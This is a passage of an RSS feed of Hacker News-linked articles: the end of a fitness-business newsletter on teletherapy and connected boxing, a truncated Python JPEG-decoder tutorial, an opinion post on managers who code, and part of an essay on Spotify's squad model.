          <p>Teletherapy is gaining traction during the pandemic. It just might be the key to unlocking access for millions of individuals battling mental illness.</p>
<p>There’s a&nbsp;<a href="https://insider.fitt.co/wellness-startups-mental-health/" target="_blank" rel="noopener">shocking gap</a>&nbsp;between demand (those in need of care) and supply (access to affordable care).</p>
<ul>
<li>46M Americans report experiencing mental illness each year, while only 42.6% received treatment.</li>
<li>Individuals who are able to access care will wait an average of&nbsp;<a href="https://www.psychiatryadvisor.com/home/practice-management/long-wait-times-typical-for-psychiatry-appointments/" target="_blank" rel="noopener">25 days</a>&nbsp;for an appointment.</li>
<li>With in-room therapy costing $150–$400 per session, plus the added cost of medication,&nbsp;<a href="https://www.kff.org/medicaid/report/mental-health-financing-in-the-united-states/" target="_blank" rel="noopener">45%</a>&nbsp;of untreated individuals cite cost as a barrier.</li>
</ul>
<p><strong>Pros:</strong>&nbsp;During COVID, the majority of therapists switched from in-person to remote therapy. A recent&nbsp;<a href="https://www.apaservices.org/practice/legal/technology/psychologists-embrace-telehealth" target="_blank" rel="noopener">survey</a>&nbsp;found that three quarters of clinicians are exclusively using teletherapy. The fact that teletherapy has been&nbsp;<a href="https://pubmed.ncbi.nlm.nih.gov/26864655/" target="_blank" rel="noopener">shown to be</a>&nbsp;just as effective as in-person therapy for treating PTSD, depression, and anxiety helped solidify the switch.</p>
<p><strong>Cons:</strong>&nbsp;The convenience and flexibility of remote care have proven beneficial, but concerns related to privacy regulations, insurance coverage, Zoom fatigue, and missing non-verbal cues leave a lot of room for improving the experience.</p>
<p>As consumer demand for digital behavioral health grows, investors are seizing the moment.</p>
<ul>
<li>According to&nbsp;<em>Rock Health</em>, in the first half of 2020, digital behavioral health companies received&nbsp;<a href="https://rockhealth.com/reports/2020-midyear-digital-health-market-update-unprecedented-funding-in-an-unprecedented-time/" target="_blank" rel="noopener">$588M</a>&nbsp;in funding — a number equal to the annual funding for this category in any previous year.</li>
</ul>
<p><strong>Looking ahead:</strong>&nbsp;With anxiety and isolation at an&nbsp;<a href="https://insider.fitt.co/insider-newsletter-issue-82-ending-addiction/" target="_blank" rel="noopener">all-time high</a>, the need to confront the&nbsp;<a href="https://insider.fitt.co/wellness-startups-mental-health/" target="_blank" rel="noopener">mental health crisis</a>&nbsp;has never been greater. A bright spot amid the pandemic, digital behavioral health is&nbsp;<a href="https://insider.fitt.co/wellness-startups-stigma/" target="_blank" rel="noopener">destigmatizing</a>&nbsp;and expanding access to care.</p>
<p><strong>Related:</strong>&nbsp;<a href="https://insider.fitt.co/23-alex-katz-ceo-of-two-chairs/" target="_blank" rel="noopener">Two Chairs CEO Alex Katz</a>&nbsp;on the Fitt Insider podcast</p>
        </div>
      </div>

            <div>
        <div>
                      <h2>🥊 Put ’em Up</h2>
          
          <p>Liteboxer, the latest&nbsp;<a href="https://us15.campaign-archive.com/?u=4c6bc12e271bc681951ed945a&amp;id=f14e6a628d" target="_blank" rel="noopener">Peloton of ‘X’</a>&nbsp;upstart, is taking aim at boxing within the booming connected fitness category.</p>
<p><strong>What it is:</strong>&nbsp;A competitor to FightCamp, an interactive at-home boxing experience, Liteboxer offers a free-standing, light-up punching bag for $1,495 and a $29/month content subscription.</p>
<p><strong>How it works:</strong>&nbsp;While FightCamp offers punch tracking technology and a variety of workouts from “real fighters”, Liteboxer looks a lot like Dance Dance Revolution for boxing. Flashing lights synced to music tell users where to hit and a force-tracking bag measures performance.</p>
<p><strong>Looking ahead:</strong>&nbsp;Following in Peloton’s footsteps is tempting, but surely at-home fitness has a ceiling — especially when every piece of equipment costs $1,500 or more.</p>
<p>For their part, Peloton appears to be rethinking the category a bit. The company was rumored to be working on a connected rower à la Hydrow. But recently, CFO Jill Woodworth&nbsp;<a href="https://outline.com/9fv3sB" target="_blank" rel="noopener">said</a>&nbsp;the company will forgo the rower, for now, in favor of a cheaper treadmill. Woodworth also said developing a product for the “boot camp category” is a priority. Is Peloton’s Mirror competitor in the works?</p>
<p><strong>Related:</strong>&nbsp;<a href="https://insider.fitt.co/7-khalil-zahar-co-founder-ceo-of-fightcamp/" target="_blank" rel="noopener">FightCamp CEO Khalil Zahar</a>&nbsp;on the Fitt Insider podcast</p>
        </div>
      </div>

            <div>
        <div>
                      <h2>📰 News &amp; Notes</h2>
          
          <ul>
<li>The designification of&nbsp;<a href="https://www.metropolismag.com/interiors/healthcare-interiors/the-problem-with-the-designification-of-health-care/" target="_blank" rel="noopener">health</a>.</li>
<li>A&nbsp;<a href="https://twitter.com/joevennare/status/1278739336268308480?s=12" target="_blank" rel="noopener">thread</a>: Apple as a healthcare company</li>
<li>A 2015&nbsp;<a href="https://medium.com/@nickcrocker/how-to-lose-200m-pounds-why-myfitnesspal-works-d00f392d9783" target="_blank" rel="noopener">memo</a>: How MyFitnessPal works.</li>
<li>Meet&nbsp;<a href="https://highcourt.co/" target="_blank" rel="noopener">Highcourt</a>, NYC’s new wellness-focused “leisure club”.</li>
<li>Who are the best early-stage fitness and wellness&nbsp;…</li></ul></div></div></section></div></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://insider.fitt.co/issue-no-87-why-mirror-sold/">https://insider.fitt.co/issue-no-87-why-mirror-sold/</a></em></p>]]>
            </description>
            <link>https://insider.fitt.co/issue-no-87-why-mirror-sold/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23838564</guid>
            <pubDate>Tue, 14 Jul 2020 22:04:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Understanding and writing a JPEG decoder in Python]]>
            </title>
            <description>
<![CDATA[
Score 243 | Comments 35 (<a href="https://news.ycombinator.com/item?id=23837838">thread link</a>) | @sfpoet
<br/>
July 14, 2020 | https://yasoob.me/posts/understanding-and-writing-jpeg-decoder-in-python/ | <a href="https://web.archive.org/web/*/https://yasoob.me/posts/understanding-and-writing-jpeg-decoder-in-python/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article itemscope="" itemtype="http://schema.org/BlogPosting">
			<span>
				<a target="_blank" href="https://github.com/yasoob/personal_blog/tree/master/content/posts/understanding-and-writing-jpeg-decoder-in-python.md">Source</a>
			</span>
			
				<p><img src="https://d33wubrfki0l68.cloudfront.net/797fe040e65dc288b7f22489dbad160e1e4998b8/0496b/images/decoding_jpeg/hero-image.png">
				</p>
			
			
			<span>
				
				<time itemprop="datePublished" datetime="2020-07-14">July 14, 2020</time>
				
			</span>
			<section itemprop="entry-text">
				

<p>Hi everyone! 👋 Today we are going to understand the JPEG compression algorithm. One thing a lot of people don’t know is that JPEG is not a format but rather an algorithm. The JPEG images you see are mostly in the JFIF format (JPEG File Interchange Format) that internally uses the JPEG compression algorithm. By the end of this article, you will have a much better understanding of how the JPEG algorithm compresses data and how you can write some custom Python code to decompress it. We will not be covering all the nuances of the JPEG format (like progressive scan) but rather only the basic baseline format while writing our decoder.</p>

<h2 id="introduction">Introduction</h2>

<p>Why write another article on JPEG when there are already hundreds of articles on the internet? Well, normally when you read articles on JPEG, the author just gives you details about what the format looks like. You don’t implement any code to do the actual decompression and decoding. Even if you do write code, it is in C/C++ and not accessible to a wide group of people. I plan on changing that by showing you how a basic JPEG decoder works using Python 3. I will be basing my decoder on <a href="https://github.com/aguaviva/micro-jpeg-visualizer/blob/master/micro-jpeg-visualizer.py">this</a> MIT licensed code but will be heavily modifying it for increased readability and ease of understanding. You can find the modified code for this article on my  <a href="https://github.com/yasoob/Baseline-JPEG-Decoder">GitHub repo</a>.</p>

<h2 id="different-parts-of-a-jpeg">Different parts of a JPEG</h2>

<p>Let’s start with this nice image by <a href="https://twitter.com/angealbertini">Ange Albertini</a>. It lists all different parts of a simple JPEG file. Take a look at it. We will be exploring each segment. You might have to refer to this image quite a few times while reading this tutorial.</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/bdc1363abbd5744200ec5283d4154e55143df86c/8c624/images/decoding_jpeg/jpegrgb_dissected.png" alt="JPEGRGB_dissected.png"></p>

<p>At the very basic level, almost every binary file contains a couple of markers (or headers). You can think of these markers as sort of like bookmarks. They are very crucial for making sense of a file and are used by programs like <code>file</code> (on Mac/Linux) to tell us details about a file. These markers define where some specific information in a file is stored. Most of the markers are followed by <code>length</code> information for the particular marker segment. This tells us how long that particular segment is.</p>

<h3 id="file-start-file-end">File Start &amp; File End</h3>

<p>The very first marker we care about is <code>FF D8</code>. It tells us that this is the start of the image. If we don’t see it we can assume this is some other file. Another equally important marker is <code>FF D9</code>. It tells us that we have reached the end of an image file. Every marker, except for <code>FFD0</code> to <code>FFD9</code> and <code>FF01</code>, is immediately followed by a length specifier that will give you the length of that marker segment. As for the image file start and image file end markers, they will always be two bytes long each.</p>

<p>Throughout this tutorial, we will be working with this image:</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/7344493a5ee7126f8286dd83ade191cab9e7f292/fbea3/images/decoding_jpeg/profile.jpg" alt="Profile"></p>

<p>Let’s write some code to identify these markers.</p>

<pre><code>from struct import unpack


marker_mapping = {
    0xffd8: "Start of Image",
    0xffe0: "Application Default Header",
    0xffdb: "Quantization Table",
    0xffc0: "Start of Frame",
    0xffc4: "Define Huffman Table",
    0xffda: "Start of Scan",
    0xffd9: "End of Image"
}


class JPEG:
    def __init__(self, image_file):
        with open(image_file, 'rb') as f:
            self.img_data = f.read()
    
    def decode(self):
        data = self.img_data
        while(True):
            marker, = unpack("&gt;H", data[0:2])
            print(marker_mapping.get(marker))
            if marker == 0xffd8:
                data = data[2:]
            elif marker == 0xffd9:
                return
            elif marker == 0xffda:
                data = data[-2:]
            else:
                lenchunk, = unpack("&gt;H", data[2:4])
                data = data[2+lenchunk:]            
            if len(data)==0:
                break        

if __name__ == "__main__":
    img = JPEG('profile.jpg')
    img.decode()    

# OUTPUT:
# Start of Image
# Application Default Header
# Quantization Table
# Quantization Table
# Start of Frame
# Huffman Table
# Huffman Table
# Huffman Table
# Huffman Table
# Start of Scan
# End of Image
</code></pre>

<p>We are using <a href="https://docs.python.org/3/library/struct.html">struct</a> to unpack the bytes of image data. <code>&gt;H</code> tells <code>struct</code> to treat the data as big-endian and of type <code>unsigned short</code>. The data in JPEG is stored in big-endian format. Only the EXIF data <em>can</em> be in little-endian (even though it is uncommon). And a short is of size 2 so we provide <code>unpack</code> two bytes from our <code>img_data</code>. You might ask yourself how we knew it was a <code>short</code>. Well, we know that the markers in JPEG are 4 hex digits: <code>ffd8</code>. One hex digit equals 4 bits (<sup>1</sup>⁄<sub>2</sub> byte) so 4 hex digits will equal 2 bytes and a short is equal to 2 bytes.</p>

<p>The Start of Scan section is immediately followed by image scan data and that image scan data doesn’t have a length specified. It continues till the “end of file” marker is found so for now we are manually “seeking” to the EOF marker whenever we see the SOC marker.</p>

<p>Now that we have the basic framework in place, let’s move on and figure out what the rest of the image data contains. We will go through some necessary theory first and then get down to coding.</p>

<h2 id="encoding-a-jpeg">Encoding a JPEG</h2>

<p>I will first explain some basic concepts and encoding techniques used by JPEG and then decoding will naturally follow from that as a reverse of it. In my experience, directly trying to make sense of decoding is a bit hard.</p>

<p>Even though the image below won’t mean much to you right now, it will give you some anchors to hold on to while we go through the whole encoding/decoding process. It shows the steps involved in the JPEG encoding process: (<a href="https://users.cs.cf.ac.uk/Dave.Marshall/Multimedia/node234.html">src</a>)</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/7237dd0093b6a8070b2c927673fd73bc797561d2/33b0a/images/decoding_jpeg/encoding.png" alt="JPEG Encoding process"></p>

<h3 id="jpeg-color-space">JPEG Color Space</h3>

<p>According to the JPEG spec (<a href="http://www.itu.int/rec/T-REC-T.872-201206-I/en">ISO/IEC 10918-6:2013 (E)</a>, section 6.1):</p>

<blockquote>
<ul>
<li>Images encoded with only one component are assumed to be grayscale data in which 0 is black and 255 is white.</li>
<li>Images encoded with three components are assumed to be RGB data encoded as YCbCr unless the image contains an APP14 marker segment as specified in 6.5.3, in which case the color encoding is considered either RGB or YCbCr according to the application data of the APP14 marker segment. The relationship between RGB and YCbCr is defined as specified in Rec. ITU-T T.871 | ISO/IEC 10918-5.</li>
<li>Images encoded with four components are assumed to be <strong>CMYK</strong>, with (0,0,0,0) indicating white unless the image contains an APP14 marker segment as specified in 6.5.3, in which case the color encoding is considered either <strong>CMYK</strong> or <strong>YCCK</strong> according to the application data of the APP14 marker segment. The relationship between <strong>CMYK</strong> and <strong>YCCK</strong> is defined as specified in clause 7.</li>
</ul>
</blockquote>

<p>Most JPEG algorithm implementations use luminance and chrominance (YUV encoding) instead of RGB. This is super useful in JPEG as the human eye is pretty bad at seeing high-frequency brightness changes over a small area so we can essentially reduce the amount of frequency and the human eye won’t be able to tell the difference. Result? A highly compressed image with almost no visible reduction in quality.</p>

<p>Just like each pixel in RGB color space is made up of 3 bytes of color data (Red, Green, Blue), each pixel in YUV uses 3 bytes as well but what each byte represents is slightly different. The Y component determines the brightness of the color (also referred to as luminance or luma), while the U  and V components determine the color (also known as chroma). The U component refers to the amount of blue color and the V component refers to the amount of red color.</p>

<p>This color format was invented when color televisions weren’t super common and engineers wanted to use one image encoding format for both color and black and white televisions. YUV could be safely displayed on a black and white TV if color wasn’t available. You can read more about its history on <a href="https://www.wikiwand.com/en/YUV">Wikipedia</a>.</p>

<h3 id="discrete-cosine-transform-quantization">Discrete Cosine Transform &amp; Quantization</h3>

<p>JPEG converts an image into chunks of 8x8 blocks of pixels (called MCUs or Minimum Coding Units), changes the range of values of the pixels so that they center on 0 and then applies Discrete Cosine Transformation to each block and then uses quantization to compress the resulting block. Let’s get a high-level understanding of what all of these terms mean.</p>

<p>A Discrete Cosine Transform is a method for converting discrete data points into a combination of cosine waves. It seems pretty useless to spend time converting an image into a bunch of cosines but it makes sense once we understand DCT in combination with how the next step works. In JPEG, DCT will take an 8x8 image block and tell us how to reproduce it using an 8x8 matrix of cosine functions.  <a href="https://www.impulseadventure.com/photo/jpeg-minimum-coded-unit.html">Read more here</a>)</p>

<p>The 8x8 matrix of cosine functions look like this:</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/97f11adca54888172fc19cef52e514ef0e8b46fd/1a72e/images/decoding_jpeg/cosine-funcs.png" alt="Cosine functions"></p>

<p>We apply DCT to each component of a pixel separately. The output of applying DCT is an 8x8 coefficient matrix that tells us how much each cosine function (out of 64 total functions) contributes to the 8x8 input matrix. The coefficient matrix of a DCT generally contains bigger values in the top left corner of the coefficient matrix and smaller values in the bottom right corner. The top left corner represents the lowest frequency cosine function and the bottom right represents the highest frequency cosine function.</p>

<p>What this tells us is that most images contain a huge amount of low-frequency information and a small amount of high-frequency information. If we turn the bottom right components of each DCT matrix to 0, the resulting image would still appear the same because, as I mentioned, humans are bad at observing high-frequency changes. This is exactly what we do in the next step.</p>

<p>I found a wonderful video on this topic. Watch it if DCT doesn’t make too much sense.</p>

<iframe width="560" height="326" src="https://www.youtube.com/embed/Q2aEzeMDHMA" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>

<p>We have all heard that JPEG is a lossy compression algorithm but so far we haven’t done anything lossy. We have only transformed 8x8 blocks of YUV components into 8x8 blocks of cosine functions with no loss of information. The lossy part comes in the quantization step.</p>

<p>Quantization is a process in which we take a couple of values in a specific range and turns them into a discrete value. For our case, this is just a fancy name for converting the higher …</p></section></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://yasoob.me/posts/understanding-and-writing-jpeg-decoder-in-python/">https://yasoob.me/posts/understanding-and-writing-jpeg-decoder-in-python/</a></em></p>]]>
            </description>
            <link>https://yasoob.me/posts/understanding-and-writing-jpeg-decoder-in-python/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23837838</guid>
            <pubDate>Tue, 14 Jul 2020 21:03:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Manager Can’t Code? They Shouldn’t Be Your Manager]]>
            </title>
            <description>
<![CDATA[
Score 46 | Comments 57 (<a href="https://news.ycombinator.com/item?id=23837614">thread link</a>) | @lanecwagner
<br/>
July 14, 2020 | https://qvault.io/2020/07/14/your-manager-cant-code-they-shouldnt-be-your-manager/ | <a href="https://web.archive.org/web/*/https://qvault.io/2020/07/14/your-manager-cant-code-they-shouldnt-be-your-manager/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text">
			
<p>Managers who can’t code are an outdated artifact of corporate America circa 2005. The best managers that I’ve had spend ~80% of their time coding, architecting, or doing technical work that requires engineering prowess. If your manager thinks coding is “beneath” them then they need a dose of humble pie. Your organization would likely be better off without them.</p>



<h2><span id="But_Managers_Manage_People">But Managers Manage <em>People</em>!</span>
</h2>



<p>There is a long-running stigma associated with developers, that we are all geeks who can’t handle interpersonal relationships. Due to our code monkey nature, we need “people people” who can go to meetings for us and communicate our efforts effectively to the higher-ups.</p>



<div><figure><img src="https://qvault.io/wp-content/uploads/2020/07/joke-extrovert.jpg" alt="introverted programmers are an outdated meme" srcset="https://qvault.io/wp-content/uploads/2020/07/joke-extrovert.jpg 700w, https://qvault.io/wp-content/uploads/2020/07/joke-extrovert-300x184.jpg 300w" sizes="(max-width: 700px) 100vw, 700px" data-srcset="https://qvault.io/wp-content/uploads/2020/07/joke-extrovert.jpg 700w, https://qvault.io/wp-content/uploads/2020/07/joke-extrovert-300x184.jpg 300w" data-src="https://qvault.io/wp-content/uploads/2020/07/joke-extrovert.jpg" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></figure></div>



<p>While the above is still funny, it’s <em>outdated</em>. As the developer community has grown exponentially in the last 20 years, so too has the personality diversity amongst its members. In other words, it is<strong> not hard to find developers with the soft-skills </strong>necessary for management positions.</p>



<h2><span id="Managers_Should_Help">Managers Should Help</span>
</h2>



<p>I am a firm believer in the following:</p>



<figure><img src="https://qvault.io/wp-content/uploads/2020/07/1_cdTc7T-pGbt5RnX1e9ayoA.png" alt="" srcset="https://qvault.io/wp-content/uploads/2020/07/1_cdTc7T-pGbt5RnX1e9ayoA.png 1024w, https://qvault.io/wp-content/uploads/2020/07/1_cdTc7T-pGbt5RnX1e9ayoA-300x150.png 300w, https://qvault.io/wp-content/uploads/2020/07/1_cdTc7T-pGbt5RnX1e9ayoA-768x384.png 768w" sizes="(max-width: 1024px) 100vw, 1024px" data-srcset="https://qvault.io/wp-content/uploads/2020/07/1_cdTc7T-pGbt5RnX1e9ayoA.png 1024w, https://qvault.io/wp-content/uploads/2020/07/1_cdTc7T-pGbt5RnX1e9ayoA-300x150.png 300w, https://qvault.io/wp-content/uploads/2020/07/1_cdTc7T-pGbt5RnX1e9ayoA-768x384.png 768w" data-src="https://qvault.io/wp-content/uploads/2020/07/1_cdTc7T-pGbt5RnX1e9ayoA.png" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></figure><p>While the manager doesn’t need to be the most talented developer on the team, they must at least be technically literate. When a team member goes to their boss with a technical proposal, the manager should be able to give valuable feedback.</p>



<p>In this <a href="https://hbr.org/2016/12/if-your-boss-could-do-your-job-youre-more-likely-to-be-happy-at-work">study from Harvard</a> 35,000 employees from the US and Great Britain were polled about their job satisfaction, and metrics were gathered about what influenced their happiness at work. The results showed that the <em>single greatest influencing factor </em>on employee satisfaction was whether or not their boss was technically competent. I practice what I preach, so at the <a href="https://classroom.qvault.io/">Qvault app,</a> all engineering leadership will forever be responsible for pushing code.</p>



<p>Contrast the idea of a competent boss with the all-too-familiar experience of going to a <a href="https://qvault.io/2020/05/18/leave-scrum-to-rugby-i-like-getting-stuff-done/">non-technical middle-management type</a> with an engineering problem, only to be stuck in a teaching session because the boss has never heard of a pub-sub system.</p>



<figure><img src="https://qvault.io/wp-content/uploads/2020/07/9e3a6f35f44188bad76c100f3560ce69.gif" alt="" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></figure><h2><span id="Managers_Need_Empathy">Managers Need Empathy</span>
</h2>



<p>A good manager has empathy for those who report to them. If the boss doesn’t code or hasn’t written code in a long time, they won’t understand the daily problems that their team is faced with. A good engineering leader will not only understand modern problems, but they make it their role to actively seek technical solutions in an ever-changing innovative landscape.</p>



<h2><span id="INB4_So_the_CEO_needs_to_be_able_to_code">INB4: “So the CEO needs to be able to code?”</span>
</h2>



<p>No, but the CTO does!</p>



<p>I am sympathetic to the idea that the CTO will have plenty of business and product-related work to focus on, but they can’t let their technical chops slip. In order to run the engineering arm of an innovative company, the person at the top should have a firm mental grasp on the implementation difficulties. If this just means reviewing architectural diagrams and reviewing pull-requests so be it, but nothing beats hands-on engineering work to stay sharp.</p>



<h2><span id="Feedback_Please">Feedback Please</span>
</h2>



<p>Have you had problems with non-technical leaders, or do you disagree completely with my opinions? Let me know through one of my <a href="https://qvault.io/contact/">social profiles</a>.</p>



<div><div>
<h2><span id="Thanks_For_Reading">Thanks For Reading</span>
</h2>



<p>Follow us on Twitter <a href="https://twitter.com/q_vault">@q_vault</a> if you have any questions or comments</p>



<p>Take game-like coding courses on <a href="https://classroom.qvault.io/#/">Qvault Classroom</a></p>



<p><a href="https://mailchi.mp/5c7f5c281bbe/qvault-newsletter-subscribe">Subscribe</a> to our Newsletter for more educational articles</p>
</div></div>



<h2><span id="Related_Articles">Related Articles:</span>
</h2>



<ul><li><a href="https://qvault.io/2020/05/18/leave-scrum-to-rugby-i-like-getting-stuff-done/">Leave Scrum to Rugby, I Like Getting Stuff Done</a></li></ul>



		</div></div>]]>
            </description>
            <link>https://qvault.io/2020/07/14/your-manager-cant-code-they-shouldnt-be-your-manager/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23837614</guid>
            <pubDate>Tue, 14 Jul 2020 20:46:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Failed SquadGoals: Spotify doesn’t use the Spotify model and neither should you]]>
            </title>
            <description>
<![CDATA[
Score 16 | Comments 1 (<a href="https://news.ycombinator.com/item?id=23837535">thread link</a>) | @wahnfrieden
<br/>
July 14, 2020 | https://www.jeremiahlee.com/posts/failed-squad-goals/?hn | <a href="https://web.archive.org/web/*/https://www.jeremiahlee.com/posts/failed-squad-goals/?hn">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
<!-- Spread 1 -->
<section>
<section>
<video autoplay="true" muted="true" loop="true">
<source srcset="https://www.jeremiahlee.com/posts/failed-squad-goals/cover.png" media="(prefers-reduced-motion: reduce)">
<source src="https://www.jeremiahlee.com/posts/failed-squad-goals/cover.webm" type="video/webm">
<source src="https://www.jeremiahlee.com/posts/failed-squad-goals/cover.m4v" type="video/mp4">
<img src="https://www.jeremiahlee.com/posts/failed-squad-goals/cover.png" alt="Taylor Swift and her squad walking away from an explosion in front of the Spotify office at Birger Jarlsgatan.">
</video>
</section>
<section>
<div>

<p><b>Spotify</b> doesn’t use <em>“the Spotify model”</em><br>and neither should you.</p>
<p>By Jeremiah Lee</p>
<p>Sunday, April 19, 2020 • <a href="https://anchor.fm/jeremiah-oral-lee/episodes/Spotifys-Failed-SquadGoals-edia0p">Listen</a> •&nbsp;<a href="https://oyomy.fr/2020/04/l-echec-du-modele-spotify/" hreflang="fr">En français</a> •&nbsp;<a href="https://jp.quora.com/q/agile/Spotify%E3%81%AF-Spotify%E3%83%A2%E3%83%87%E3%83%AB-%E3%82%92%E4%BD%BF%E3%81%A3%E3%81%A6%E3%81%84%E3%81%AA%E3%81%84" hreflang="ja">日本語で</a> • <a href="https://flavioclesio.com/2020/05/18/o-modelo-de-squadgoals-do-spotify-falhou/" hreflang="pt-br">Português (Brasil)</a></p>
</div>
</section>
</section>
<!-- Spread 2 -->
<section>
<section>
<div>
<p>Of all the allures of startup culture, few are more desireable than the speed and nimbleness of a small team. Maintaining that feeling as a company grows is a challenge. In 2012, Spotify shared its way of working and suggested it had figured it out.<sup><a href="#1">1</a></sup></p>
<p>I was excited to see <em>the Spotify model</em> in action when I interviewed for a product management role at its Stockholm headquarters in 2017. However, the recruiter surprised me before the first interview. She cautioned me to not expect Spotify to be an <a href="https://en.wikipedia.org/wiki/Agile_software_development">Agile</a> utopia.</p>
<p>I joined the company after it had tripled in size to 3,000 people over 18 months. I learned the famed squad model was only ever aspirational and never fully implemented. I witnessed organizational chaos as the company’s leaders incrementally transitioned to more traditional management structures.</p>
<p>When I asked my coworkers why the content was not removed or updated to reflect reality, I never got a good answer. Many people ironically thought the posts were great for recruiting. I no longer work at Spotify, so I am sharing my experience to set the record straight. The Spotify squad model failed Spotify and it will fail your company too.</p>
</div>
</section>
<section>
<div>
<h3>But you don’t have to take my word for it.</h3>
<p>The co-author of the Spotify model<sup><a href="#2">2</a></sup> and multiple agile coaches who worked at Spotify have been telling people to not copy it for years. Unfortunately, truth doesn’t spread as quickly or as widely as an idea people want to believe in.</p>
<blockquote>
<p>“Even at the time we wrote it, we weren’t doing it. It was part ambition, part approximation. People have really struggled to copy something that didn’t really exist.”</p>
</blockquote>
<p>—Joakim Sundén, agile coach at Spotify&nbsp;2011–2017<sup><a href="#4">4</a></sup></p>
<blockquote>
<p><em>“It worries me when people look at what we do and think it’s a framework they can just copy and implement.</em> … We are really trying hard now to emphasize we have problems as well. It’s not all ‘shiny and everything works well and all our squads are super amazing’.”</p>
</blockquote>
<p>—Anders Ivarsson, co-author of the Spotify&nbsp;whitepaper<sup><a href="#3">3</a></sup></p>
</div>
</section>
</section>
<!-- Spread 3 -->
<section>
<section>
<div>
<h2>Recap</h2>
<p>You can read and watch the <a href="#1">original content</a> in less than 30 minutes or <a href="#spread-4">skip to the next section</a> if you are familiar. Here is a brief summary.</p>
<p>Spotify had teams it called <em>squads</em> because it sounded cooler (not joking). A group of teams were organized into a department called a <em>tribe</em>. Each team was intended to be an autonomous mini-startup, with a product manager acting as mini-CEO for a feature area. The teams had designers and software engineers with a range of specializations. The intent was that a team should have every skill necessary without needing to rely on another team for success.</p>
<p>Product managers had a traditional management structure. A product manager for a team reported to their department’s product director (<em>“tribe lead”</em>). Same for designers. Software engineers, however, were managed outside of the team structure.</p>
</div>
</section>
<section>
<div>
<p><em>“Chapter leads”</em> managed software engineers specializing in a specific type of software development across the department. For example, all of the software engineers working on backend APIs across all the teams within the department would have one manager and all of the Android mobile engineers in the department would have a different manager. The intent was to allow engineers to be moved between teams within the department to best meet business requirements without them having to change managers.</p>
<figure>
<video autoplay="true" muted="true" loop="true">
<source src="https://www.jeremiahlee.com/posts/failed-squad-goals/scaling-spotify-squads.webm" type="video/webm">
<source src="https://www.jeremiahlee.com/posts/failed-squad-goals/scaling-spotify-squads.m4v" type="video/mp4">
<img src="https://www.jeremiahlee.com/posts/failed-squad-goals/scaling-spotify-squads.png" alt="Spotify matrix organization diagram. A department is called a tribe and has multiple squads, another name for a team. Each squad has a product owner, another name for a product manager. Software engineers of the same discipline across multiple teams are called a chapter and managed by a chapter lead, another name for an engineering manager.">
</video>
<figcaption>Spotify tried a long-lived matrix team structure with unusual word choices.<sup><a href="#1">1</a></sup> It did not work well.</figcaption>
</figure>
</div>
</section>
</section>
<!-- Spread 4 -->
<section id="spread-4">
<section>

</section>
<section id="matrix-management-sucks">
<div>
<h3>Matrix management solved the wrong problem</h3>
<p>The “full stack” agile team worked well, but the matrix management of software engineers introduced more problems than it solved.</p>
<ul>
<li><p>Teams at Spotify were rather long-lived. The benefit of not having to change manager when moving to another team was limited.</p></li>
<li><p>Engineering managers in this model had little responsibility beyond the career development of the people they managed. Even then, their ability to help with interpersonal people skills development was limited. An engineering manager would not manage enough of the other people on the team or be involved enough in the daily context to independently assess conflict within the team.</p></li>
</ul>
</div>
</section>
</section>
<!-- Spread 5 -->
<section>
<section>
<div>
<ul>
<li><p>Without a single engineering manager responsible for the engineers on a team, the product manager lacked an equivalent peer—the mini-CTO to their mini-CEO role. There was no single person accountable for the engineering team’s delivery or who could negotiate prioritization of work at an equivalent level of responsibility.</p><p>When disagreements within the engineering team arose, the product manager needed to negotiate with all of the engineers on the team. If the engineers could not reach a consensus, the product manager needed to escalate to as many engineering managers as there were engineering specializations within the team. A team with backend, Web app, and mobile app engineers would have at least 3 engineering managers who might need to get involved. If those engineering managers could not reach a consensus, a single team’s issue would have to escalate to the department’s engineering director.</p></li>
</ul>
</div></section>
<section id="matrix-management-sucks">
<div>
<blockquote>
<p>“Chapter leads are servant-leaders who help you grow as an individual. They don’t really work with any team. They have direct reports on all the teams. They don’t have really any accountability for the delivery. They aren’t taking that responsibility. It’s easy to see the product owner as the manager for the team.”</p>
</blockquote>
<p>—Joakim Sundén, agile coach at Spotify<sup><a href="#4">4</a></sup></p>
<p><strong>Learn from Spotify’s mistakes:</strong></p>
<ul>
<li>A product—design—engineering team typically contains more engineers than designers or product managers. Having a single engineering manager for the engineers on the team creates an accountable escalation path for conflict within the team.</li>
<li>Product managers should have an equivalent peer for engineering. Product managers should be accountable for the prioritization of work. Engineering managers should be accountable for the engineers’ execution, which includes being able to negotiate speed and quality tradeoffs with the product manager.</li>
</ul>
</div>
</section>
</section>
<!-- Spread 6 -->
<section>
<section id="too-much-autonomy">
<div>
<h3>Spotify fixated on team autonomy</h3>
<p>When a company is small, teams have to do a wide range of work to deliver and have to shift initiatives frequently. As a company grows from startup to scale-up, duplicated functions across teams move to new teams dedicated to increasing organization efficiency by reducing duplication. With more teams, the need for a team to shift initiative decreases in frequency. Both of these changes allow for teams to think more deeply and long term about the problems they are scoped to solve. Faster iteration, however, is not guaranteed. Every responsibility a team cedes to increase its focus becomes a new cross-team dependency.</p>
<p>Spotify did not define a common process for cross-team collaboration. Allowing every team to have a unique way of working meant each team needed a unique way of engagement when collaborating. Overall organization productivity suffered.</p>
